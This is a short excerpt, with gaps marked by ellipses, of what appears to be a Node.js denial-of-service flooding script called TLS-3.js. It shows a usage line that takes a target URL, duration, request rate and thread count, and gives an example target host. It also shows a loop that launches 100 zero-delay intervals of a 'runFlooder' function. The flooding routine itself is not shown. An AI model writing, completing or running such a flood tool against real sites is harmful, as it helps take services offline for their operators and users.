 ...
 if (process.argv.length < 5){console.log(`Usage: node TLS-3.js URL TIME REQ_PER_SEC THREADS\nExample: node TLS-3.js https://tls.mrrage.xyz 500 8 1`); process.exit();}
...
} else {for (let i = 0; i < 100; i++) { setInterval(runFlooder, 0) }}
